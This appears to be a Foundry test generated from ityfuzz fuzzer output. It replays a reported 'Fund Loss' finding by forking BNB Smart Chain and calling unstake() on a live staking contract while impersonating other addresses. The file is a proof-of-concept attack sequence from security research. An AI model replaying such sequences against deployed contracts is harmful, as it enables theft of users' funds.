// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xf3f1abae8bfeca054b330c379794a7bf84988228,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0xf3F1aBae8BfeCA054B330C379794A7bf84988228 -c bsc --onchain-block-number 28637846 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.000 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] 0xf3F1aBae8BfeCA054B330C379794A7bf84988228.unstake(204)
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0xf3F1aBae8BfeCA054B330C379794A7bf84988228.unstake(6563447)


 */

contract Cf3f1 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 28637846);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0xf3F1aBae8BfeCA054B330C379794A7bf84988228).unstake(204);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0xf3F1aBae8BfeCA054B330C379794A7bf84988228).unstake(6563447);
    }

}

interface I {
    function unstake(uint256) external payable;
}
